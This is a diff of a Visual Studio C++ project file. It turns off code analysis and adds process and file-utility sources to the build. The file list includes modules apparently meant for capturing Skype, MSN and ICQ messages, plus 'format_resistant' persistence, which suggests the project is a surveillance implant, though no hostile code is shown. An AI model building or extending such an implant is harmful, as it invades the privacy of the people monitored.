@@ -59,9 +59,11 @@
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <IncludePath>$(SolutionDir)include;$(SolutionDir)include\mapi;$(SolutionDir)libs\;$(IncludePath)</IncludePath>
+    <EnableMicrosoftCodeAnalysis>false</EnableMicrosoftCodeAnalysis>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <IncludePath>$(SolutionDir)include;$(SolutionDir)include\mapi;$(SolutionDir)libs\;$(IncludePath)</IncludePath>
+    <EnableMicrosoftCodeAnalysis>false</EnableMicrosoftCodeAnalysis>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <ClCompile>
@@ -131,10 +133,12 @@
     <ClCompile Include="DeepFreeze.cpp" />
     <ClCompile Include="demo_functions.cpp" />
     <ClCompile Include="explore_directory.cpp" />
+    <ClCompile Include="fileutil.cpp" />
     <ClCompile Include="format_resistant.cpp" />
     <ClCompile Include="H4-DLL.cpp" />
     <ClCompile Include="IMAgent\QMsnLive2011.cpp" />
     <ClCompile Include="LOG.cpp" />
+    <ClCompile Include="process.cpp" />
     <ClCompile Include="SkypeACL\HashUtil.cpp" />
     <ClCompile Include="SkypeACL\KeyGen_SBOX.cpp" />
     <ClCompile Include="SkypeACL\SkypeACL.cpp" />
@@ -211,6 +215,7 @@
     <ClInclude Include="IMAgent\QSkype3.h" />
     <ClInclude Include="IMAgent\QSkype4.h" />
     <ClInclude Include="md5.h" />
+    <ClInclude Include="process.h" />
     <ClInclude Include="sha1.h" />
     <ClInclude Include="IMAgent\QAgent.h" />
     <ClInclude Include="IMAgent\QIcq.h" />
